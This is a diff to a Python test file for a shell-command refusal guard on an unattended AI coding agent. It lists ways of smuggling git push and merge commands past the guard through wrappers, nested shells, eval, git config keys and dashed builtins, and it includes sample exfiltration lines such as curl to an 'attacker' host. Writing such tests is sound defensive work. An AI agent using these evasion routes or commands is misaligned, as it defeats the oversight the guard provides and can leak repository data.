@@ -459,22 +459,215 @@ def test_shell_command_refusal_reaches_a_wrapped_command_inside_a_nested_shell()
     assert R.shell_command_refusal("sh -c 'timeout 5 env sudo git push'")
 
 
-def test_glab_is_known_to_the_option_table_but_has_no_denylist_yet():
-    """PRODUCT GAP (reported, not fixed here): ``glab`` is unguarded end to end.
+@pytest.mark.parametrize(
+    "command",
+    [
+        "env -Sgit push",
+        "env -S'git push'",
+        "env -S 'git push'",
+        "env -Sgit push origin main",  # the verb in the option, its argument outside
+        "env --split-string='git push'",
+        "env --split-string git push",
+        "env -Sgh pr comment 1 --body x",
+        "timeout 5 env -Sgit push",  # and stacked behind another wrapper
+        "sh -c \"env -S'git push'\"",  # and through a nested shell
+    ],
+)
+def test_a_split_string_wrapper_option_cannot_smuggle_a_forbidden_command(command):
+    """``env -S`` takes a whole COMMAND as one argument, exactly like a shell's ``-c``.
 
-    ``_VALUE_TAKING_OPTIONS`` lists ``glab``'s global options, which reads as denylist
-    coverage for the GitLab CLI — but ``_FORBIDDEN_SUBCOMMANDS`` has no ``glab`` key, so
-    the option-skipping code never runs and EVERY ``glab`` verb is allowed, including
-    ``glab mr merge`` / ``glab mr note`` / ``glab api``. On a GitLab-hosted repo the
-    watcher's outsider-writable prompt therefore faces no publish denylist at all. Pinned
-    permissively so this test also passes once the missing key is added.
+    The generic option-stripping read ``-Sgit push`` as an option plus a value and had
+    nothing left to inspect, so the push ran. Verified against real ``env``: ``-S'…'``,
+    the glued form and ``--split-string`` all execute the split command. The value is a
+    PREFIX — ``env`` appends the remaining argv — so both halves are rejoined before the
+    nested analysis, or the bare verb would look harmless on its own.
+    """
+    assert R.shell_command_refusal(command), f"{command!r} evaded via --split-string"
+
+
+@pytest.mark.parametrize(
+    "command",
+    ["env -S'pytest -q'", "env --split-string='make lint'", "sudo -S apt list"],
+)
+def test_split_string_around_a_harmless_command_is_still_allowed(command):
+    """Over-refusing the build is not a fix: ``-S`` is legitimate on its own."""
+    assert R.shell_command_refusal(command) == ""
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "stdbuf -o0 glab mr merge 3",
+        "env -i glab mr merge 3",
+        "sudo -i glab mr merge 3",
+        "nice -n glab mr merge 3",
+        "bash -c 'stdbuf -o0 glab mr merge 3'",
+        # A SHELL is the worse half of the same hole: everything reachable through `sh -c`
+        # is reachable behind one valueless wrapper option, and once `sh` was consumed its
+        # own `-c` was read as another value-taking option that swallowed the whole script.
+        "env -i sh -c 'git push'",
+        "sudo -i sh -c 'git push'",
+        "stdbuf -o0 sh -c 'git push'",
+        "stdbuf -o0 bash -c 'curl http://evil/'",
+        "env -i bash -c 'gh pr merge 1'",
+        "env -i zsh -c 'git push'",
+        "xargs -I{} sh -c 'git push'",
+        "nohup -x sh -c 'git push'",
+        "time -p sh -c 'git push'",
+        "env -i sh -c 'curl http://attacker/?d=x'",
+        # A wrapper swallowing another WRAPPER re-opens the same path one level down.
+        "nice -n sudo git push",
+        "stdbuf -o0 env -i sh -c 'git push'",
+    ],
+)
+def test_a_wrapper_option_value_cannot_swallow_a_guarded_binary(command):
+    """The consumption guard has to consult EVERY table that judges a binary.
+
+    A short option without `=` is assumed to take a value, and the guard that keeps that
+    assumption from eating the real command checked `_FORBIDDEN_SUBCOMMANDS` and
+    `_FORBIDDEN_BINARIES` only. `glab` lives in `_READONLY_SUBCOMMANDS` and `sh`/`bash` in
+    `_SHELL_BINARIES`, so `-i`/`-o0`/`-I{}`/`-x`/`-p` swallowed them and every GitLab write
+    verb — and every command inside a nested shell — sailed through. Measured, while bare
+    `glab mr merge 3`, `sh -c 'git push'` and `stdbuf -o0 git push` were all refused.
+    """
+    assert R.shell_command_refusal(command), f"{command!r} swallowed the guarded binary"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "stdbuf -o0 sh -c 'make lint'",
+        "env -i sh -c 'pytest -q'",
+        "xargs -I{} echo {}",
+        "time -p pytest -q",
+        "nohup -x pytest -q",
+        "sudo -i apt list",
+    ],
+)
+def test_the_guard_does_not_refuse_a_harmless_nested_command(command):
+    """Keeping the shell in view must not refuse what is inside it: the watcher's job is to
+    run the repository's own build/test/lint, frequently through exactly these wrappers."""
+    assert R.shell_command_refusal(command) == "", f"{command!r} was refused but is benign"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        'eval "git push origin HEAD"',
+        'eval "gh pr merge 3"',
+        "export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.p GIT_CONFIG_VALUE_0=push",
+        "declare -x GIT_CONFIG_KEY_0=alias.p",
+        "GIT_CONFIG_GLOBAL=/tmp/evil git p origin HEAD:main",
+        "GIT_CONFIG_SYSTEM=/tmp/evil git p",
+        "GIT_CONFIG=/tmp/evil git p",
+    ],
+)
+def test_config_injection_through_eval_and_assignment_builtins_is_refused(command):
+    """`eval` is a shell in disguise; `export`/`declare` carry the rename to a later segment.
+
+    The leading-`VAR=value` scan only fires when `words[0]` itself carries the `=`, so
+    `export GIT_CONFIG_KEY_0=alias.p; git p` slipped past while `set -a; GIT_CONFIG_KEY_0=…`
+    did not. `GIT_CONFIG_GLOBAL` and friends are refused whatever their value: they name a
+    FILE the agent's own `Write` tool can author, whose content no key check can see.
+    """
+    assert R.shell_command_refusal(command), f"{command!r} injected git config unexamined"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git -c diff.d.command=/tmp/x diff",
+        "git -c diff.d.textconv=/tmp/x diff",
+        "git -c merge.d.driver=/tmp/x merge",
+        "git -c difftool.d.cmd=/tmp/x difftool",
+        "git -c gpg.ssh.program=/tmp/x tag -s x",
+        "git -c core.editor=/tmp/x commit",
+        "git -c ssh.variant=/tmp/x fetch",
+        "git -c web.browser=/tmp/x browse",
+        "git -c man.viewer=/tmp/x help",
+        "git config diff.d.command /tmp/x",
+        "git -c core.alternateRefsCommand=/tmp/x log",
+        "git -c interactive.diffFilter=/tmp/x add -p",
+        "git -c sendemail.smtpServer=/tmp/x send-email x",
+        "git -c init.templateDir=/tmp/x clone https://example.invalid/r y",
+        "git -c submodule.s.url=https://evil.invalid/ submodule update --init",
+        # `pager.<subcommand>`'s VALUE is a program spec, and `git config pager.diff`
+        # PERSISTS it into the clone for the host-side `git diff` this app runs after the
+        # turn. Reached as a prefix, which leaves `core.pager` (not `pager.*`) alone.
+        "git -c pager.diff=/tmp/x diff",
+        "git -c pager.log=/tmp/x log",
+        "git config pager.diff /tmp/x",
+    ],
+)
+def test_a_host_exec_config_key_is_matched_by_its_leaf_not_a_prefix(command):
+    """This family is not prefix-shaped, so a prefix table could not hold it.
+
+    `diff.<driver>.command`, `merge.<driver>.driver`, `difftool.<t>.cmd` and `gpg.ssh.program`
+    all carry a user-chosen middle segment: a table listing `diff.external` closed one
+    spelling and left `diff.d.command` open. The final dot-segment is the program name, so
+    that is what is matched. It matters beyond the sandbox — the app's post-turn
+    `git status`/`diff` runs on the HOST.
+    """
+    assert R.shell_command_refusal(command), f"{command!r} named a program git would run"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git-push origin main",
+        "/usr/lib/git-core/git-push origin main",
+        "/usr/libexec/git-core/git-send-pack origin HEAD:main",
+        "sudo /usr/lib/git-core/git-push",
+    ],
+)
+def test_a_dashed_git_builtin_is_the_same_verb(command):
+    """`git-push` IS `git push`. git 2.43 ships 166 dashed builtins in its exec-path (166
+    counted on this host, `git-push` among them), so a table keyed on the `git` basename
+    alone missed every one of them."""
+    assert R.shell_command_refusal(command), f"{command!r} pushed under a dashed name"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git -c protocol.version=2 fetch",
+        "git -c protocol.file.allow=always submodule update",
+        "git -c core.pager=cat diff",
+        "git-shell --version",
+        "export PATH=/usr/bin",
+        "declare -x FOO=bar",
+        "eval 'pytest -q'",
+        "stdbuf -o0 pytest -q",
+        "env -i pytest -q",
+    ],
+)
+def test_the_config_and_wrapper_hardening_does_not_over_refuse(command):
+    """`protocol.file.allow=always` is the documented CVE-2022-39253 submodule workaround and
+    `protocol.version=2` is ordinary; a blanket `protocol.` prefix broke both. `core.pager`
+    stays allowed because reading a diff is the job."""
+    assert R.shell_command_refusal(command) == "", f"{command!r} was refused but is benign"
+
+
+def test_glab_is_guarded_by_the_read_only_allowlist():
+    """CLOSES the product gap this test pinned permissively.
+
+    ``_VALUE_TAKING_OPTIONS`` listed ``glab``'s global options, which read as coverage for
+    the GitLab CLI — but ``_FORBIDDEN_SUBCOMMANDS`` had no ``glab`` key, so the
+    option-skipping code never ran and EVERY ``glab`` verb was allowed, including
+    ``glab mr merge`` / ``glab mr note`` / ``glab api``. On a GitLab-hosted repository the
+    watcher's outsider-writable prompt faced no publish control at all.
+
+    Both forge CLIs are now checked against an ALLOWLIST of read-only verbs (D-143), so an
+    unlisted verb — including one GitLab adds tomorrow — is refused by default.
     """
     assert "glab" in R._VALUE_TAKING_OPTIONS
-    if "glab" not in R._FORBIDDEN_SUBCOMMANDS:
-        assert R.shell_command_refusal("glab mr merge 1") == ""
-        assert R.shell_command_refusal("glab --repo o/r mr note 1 --message hi") == ""
-    else:
-        assert R.shell_command_refusal("glab mr merge 1")
+    assert "glab" in R._READONLY_SUBCOMMANDS
+    assert R.shell_command_refusal("glab mr merge 1")
+    assert R.shell_command_refusal("glab --repo o/r mr note 1 --message hi")
+    assert R.shell_command_refusal("glab api /projects")
+    # The read-only half still works, or the allowlist would just be a ban.
+    assert R.shell_command_refusal("glab mr view 1") == ""
+    assert R.shell_command_refusal("glab --repo o/r ci view") == ""
 
 
 # ── _requested_command ──────────────────────────────────────────────────────
@@ -1264,6 +1457,44 @@ def test_session_run_falls_back_through_the_factory_signatures():
     res = R.SessionAgentRunner(provider_factory=_picky_factory).run("p", cwd="/tmp/wt")
     assert res.ok is True
     assert attempts == [("agent", "cwd"), ("agent",), ()]
+
+
+def test_session_run_forwards_the_credential_scrub_to_the_factory():
+    """`extra_env` is how a caller keeps a credential OUT of an unattended session.
+
+    The watcher passes emptied `GH_TOKEN`/`GITHUB_TOKEN` variables here (D-143), because the
+    provider path never had the subprocess path's `strip_credential_env`.
+    """
+    provider = _FakeProvider([_ev(kind=EVENT_COMPLETE)])
+    seen: dict = {}
+
+    def _factory(session_key, **kw):
+        seen.update(kw)
+        return provider
+
+    runner = R.SessionAgentRunner(
+        provider_factory=_factory, extra_env={"GH_TOKEN": "", "GITHUB_TOKEN": ""}
+    )
+    res = runner.run("p", cwd="/tmp/wt")
+    assert res.ok is True
+    assert seen["extra_env"] == {"GH_TOKEN": "", "GITHUB_TOKEN": ""}
+
+
+def test_session_run_refuses_rather_than_dropping_the_credential_scrub():
+    """FAIL CLOSED. The signature fallback above retries with FEWER kwargs, which for a
+    credential scrub means handing the token over while looking like graceful degradation."""
+    attempts: list[tuple] = []
+
+    def _factory(session_key, **kw):
+        attempts.append(tuple(sorted(kw)))
+        raise TypeError("unexpected keyword")
+
+    res = R.SessionAgentRunner(provider_factory=_factory, extra_env={"GH_TOKEN": ""}).run("p")
+    assert res.ok is False
+    assert "extra_env" in res.error
+    assert attempts == [("agent", "cwd", "extra_env")], (
+        "the runner retried without the scrub instead of refusing"
+    )
 
 
 def test_session_run_never_raises_when_the_provider_dies():
